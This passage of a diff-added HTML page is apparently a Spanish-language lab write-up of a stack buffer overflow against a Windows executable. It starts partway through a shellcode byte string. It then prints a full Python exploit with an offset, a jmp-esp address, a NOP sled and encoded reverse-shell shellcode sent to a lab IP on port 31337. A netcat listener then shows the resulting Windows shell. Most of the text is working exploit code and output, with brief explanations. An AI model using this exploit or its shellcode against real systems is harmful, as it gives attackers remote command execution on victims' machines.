+shellcode += b"\x62\x31\x3e\xd2\xa2\x25\x4b\x45\x13\x2d\x19"
+shellcode += b"\x6a\xd8\x63\x89\xf9\xac\xab\xbe\x4a\x1a\x8a"
+shellcode += b"\xf1\x4b\x37\xee\x90\xcf\x4a\x23\x72\xf1\x84"
+shellcode += b"\x36\x73\x36\xf8\xbb\x21\xef\x76\x69\xd5\x84"
+shellcode += b"\xc3\xb2\x5e\xd6\xc2\xb2\x83\xaf\xe5\x93\x12"
+shellcode += b"\xbb\xbf\x33\x95\x68\xb4\x7d\x8d\x6d\xf1\x34"
+shellcode += b"\x26\x45\x8d\xc6\xee\x97\x6e\x64\xcf\x17\x9d"
+shellcode += b"\x74\x08\x9f\x7e\x03\x60\xe3\x03\x14\xb7\x99"
+shellcode += b"\xdf\x91\x23\x39\xab\x02\x8f\xbb\x78\xd4\x44"
+shellcode += b"\xb7\x35\x92\x02\xd4\xc8\x77\x39\xe0\x41\x76"
+shellcode += b"\xed\x60\x11\x5d\x29\x28\xc1\xfc\x68\x94\xa4"
+shellcode += b"\x01\x6a\x77\x18\xa4\xe1\x9a\x4d\xd5\xa8\xf2"
+shellcode += b"\xa2\xd4\x52\x03\xad\x6f\x21\x31\x72\xc4\xad"
+shellcode += b"\x79\xfb\xc2\x2a\x7d\xd6\xb3\xa4\x80\xd9\xc3"
+shellcode += b"\xed\x46\x8d\x93\x85\x6f\xae\x7f\x55\x8f\x7b"
+shellcode += b"\x2f\x05\x3f\xd4\x90\xf5\xff\x84\x78\x1f\xf0"
+shellcode += b"\xfb\x99\x20\xda\x93\x30\xdb\x8d\x5b\x6c\x22"
+shellcode += b"\xcd\x34\x6f\xa4\xcf\x7f\xe6\x42\xa5\x6f\xaf"
+shellcode += b"\xdd\x52\x09\xea\x95\xc3\xd6\x20\xd0\xc4\x5d"
+shellcode += b"\xc7\x25\x8a\x95\xa2\x35\x7b\x56\xf9\x67\x2a"
+shellcode += b"\x69\xd7\x0f\xb0\xf8\xbc\xcf\xbf\xe0\x6a\x98"
+shellcode += b"\xe8\xd7\x62\x4c\x05\x41\xdd\x72\xd4\x17\x26"
+shellcode += b"\x36\x03\xe4\xa9\xb7\xc6\x50\x8e\xa7\x1e\x58"
+shellcode += b"\x8a\x93\xce\x0f\x44\x4d\xa9\xf9\x26\x27\x63"
+shellcode += b"\x55\xe1\xaf\xf2\x95\x32\xa9\xfa\xf3\xc4\x55"
+shellcode += b"\x4a\xaa\x90\x6a\x63\x3a\x15\x13\x99\xda\xda"
+shellcode += b"\xce\x19\xfa\x38\xda\x57\x93\xe4\x8f\xd5\xfe"
+shellcode += b"\x16\x7a\x19\x07\x95\x8e\xe2\xfc\x85\xfb\xe7"
+shellcode += b"\xb9\x01\x10\x9a\xd2\xe7\x16\x09\xd2\x2d"</span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>¿Para que sirve el parámetro EXITFUNC=thread?</p></div></strong>
+<div><p>Gracias a esta funcion a la hora de pasarle el shellcode lo correra en un proceso hijo, de modo que podemos matar la conexión volverla a abrir y el programa seguirá funcionando<p></div></blockquote><br>
+
+<p><div>Finalmente definimos nuestro exploit final de la siguiente manera</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from</span><span class="p"> pwn </span><span class="kd">import </span><span class="p">log, socket
+
+offset </span><span class="kd">=</span><span class="na"> 146</span><span class="p">
+junk </span><span class="kd">= </span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> offset
+jmpesp </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xc3\x14\x04\x08"</span><span class="p">
+nops </span><span class="kd">= </span><span class="k">b</span><span class="s2">"\x16"</span><span class="kd"> *</span><span class="na"> 16</span><span class="p">
+
+shellcode </span><span class="kd">=</span><span class="k">  b</span><span class="s2">""</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xd9\xc6\xd9\x74\x24\xf4\x5d\xba\x8a\xe7\x9d"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xc1\x2b\xc9\xb1\x52\x83\xc5\x04\x31\x55\x13"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x03\xdf\xf4\x7f\x34\x23\x12\xfd\xb7\xdb\xe3"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x62\x31\x3e\xd2\xa2\x25\x4b\x45\x13\x2d\x19"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x6a\xd8\x63\x89\xf9\xac\xab\xbe\x4a\x1a\x8a"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xf1\x4b\x37\xee\x90\xcf\x4a\x23\x72\xf1\x84"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x36\x73\x36\xf8\xbb\x21\xef\x76\x69\xd5\x84"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xc3\xb2\x5e\xd6\xc2\xb2\x83\xaf\xe5\x93\x12"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xbb\xbf\x33\x95\x68\xb4\x7d\x8d\x6d\xf1\x34"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x26\x45\x8d\xc6\xee\x97\x6e\x64\xcf\x17\x9d"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x74\x08\x9f\x7e\x03\x60\xe3\x03\x14\xb7\x99"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xdf\x91\x23\x39\xab\x02\x8f\xbb\x78\xd4\x44"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xb7\x35\x92\x02\xd4\xc8\x77\x39\xe0\x41\x76"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xed\x60\x11\x5d\x29\x28\xc1\xfc\x68\x94\xa4"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x01\x6a\x77\x18\xa4\xe1\x9a\x4d\xd5\xa8\xf2"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xa2\xd4\x52\x03\xad\x6f\x21\x31\x72\xc4\xad"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x79\xfb\xc2\x2a\x7d\xd6\xb3\xa4\x80\xd9\xc3"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xed\x46\x8d\x93\x85\x6f\xae\x7f\x55\x8f\x7b"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x2f\x05\x3f\xd4\x90\xf5\xff\x84\x78\x1f\xf0"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xfb\x99\x20\xda\x93\x30\xdb\x8d\x5b\x6c\x22"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xcd\x34\x6f\xa4\xcf\x7f\xe6\x42\xa5\x6f\xaf"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xdd\x52\x09\xea\x95\xc3\xd6\x20\xd0\xc4\x5d"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xc7\x25\x8a\x95\xa2\x35\x7b\x56\xf9\x67\x2a"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x69\xd7\x0f\xb0\xf8\xbc\xcf\xbf\xe0\x6a\x98"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xe8\xd7\x62\x4c\x05\x41\xdd\x72\xd4\x17\x26"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x36\x03\xe4\xa9\xb7\xc6\x50\x8e\xa7\x1e\x58"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x8a\x93\xce\x0f\x44\x4d\xa9\xf9\x26\x27\x63"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x55\xe1\xaf\xf2\x95\x32\xa9\xfa\xf3\xc4\x55"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x4a\xaa\x90\x6a\x63\x3a\x15\x13\x99\xda\xda"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xce\x19\xfa\x38\xda\x57\x93\xe4\x8f\xd5\xfe"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x16\x7a\x19\x07\x95\x8e\xe2\xfc\x85\xfb\xe7"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xb9\x01\x10\x9a\xd2\xe7\x16\x09\xd2\x2d"</span><span class="p">
+
+log.info(</span><span class="s2">"Enviando shellcode ..."</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">31337</span><span class="p">))
+
+shell.send(junk </span><span class="kd">+</span><span class="p"> jmpesp </span><span class="kd">+</span><span class="p"> nops </span><span class="kd">+</span><span class="p"> shellcode </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)
+
+shell.close()
+log.success(</span><span class="s2">"Revisa tu listener"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+
+<blockquote><strong><div><p>¿Qué hace exactamente el script de explotación?</p></div></strong>
+<li>Se define el offset antes de llegar el EIP y se rellena con A</li>
+<li>Se define una dirección que haga un jmp al ESP</li>
+<li>Se dedinen 16 nops para desplazar la pila y dar tiempo para que se interprete el shellcode</li>
+<li>Al ejecutarse el shellcode nos envia una shell al host y puerto especificados</li>
+</blockquote><br><br>
+
+<p><div>Corriendo el .exe ejecutamos el exploit y recibimos una shell en nuestro listener</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> exploit.py
+[</span><span class="na">*</span><span class="p">] Enviando shellcode ...
+[</span><span class="s2">+</span><span class="p">] Revisa tu listener</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.193.1
+Microsoft Windows [Versión 10.0.22621.1105]
+(c) Microsoft Corporation. Todos los derechos reservados.
+
+C:\Users\pc1\Desktop></span><span class="no">whoami</span><span class="p">
+gatogamer1155\pc1
+
+C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
